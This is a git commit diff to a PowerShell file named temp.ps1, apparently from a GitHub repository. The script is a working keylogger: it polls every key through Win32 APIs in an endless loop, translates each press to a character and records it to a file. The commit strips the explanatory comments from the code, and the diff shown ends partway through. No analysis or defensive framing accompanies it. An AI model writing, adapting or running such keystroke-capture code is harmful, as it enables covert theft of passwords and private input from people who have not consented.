7974a5f42829aca94d4c39af5812ac8c7b303c53
Bloodshot <92547773+Bloodshot24@users.noreply.github.com>
2024-01-08 21:32:04 +0100

    Update temp.ps1

--- temp.ps1
+++ temp.ps1
@@ -12,40 +12,38 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  # load signatures and make members available
+
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
-  # create output file
+  
   $null = New-Item -Path $Path -ItemType File -Force
 
   try
   {
 
-    # create endless loop. When user presses CTRL+C, finally-block
-    # executes and shows the collected key presses
+    
     while ($d -ne 0) {
       Start-Sleep -Milliseconds 40
       
-      # scan all ASCII codes above 8
+      
       for ($ascii = 9; $ascii -le 254; $ascii++) {
         # get current key state
         $state = $API::GetAsyncKeyState($ascii)
 	$d = Get-Date -Format %s
-        # is key pressed?
+        
         if ($state -eq -32767) {
           $null = [console]::CapsLock
 
-          # translate scan code to real code
+          
           $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-          # get keyboard state for virtual keys
+          
           $kbstate = New-Object Byte[] 256
           $checkkbstate = $API::GetKeyboardState($kbstate)
 
-          # prepare a StringBuilder to receive input key
+         
           $mychar = New-Object -TypeName System.Text.StringBuilder
 
-          # translate virtual key
           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
           if ($success) 
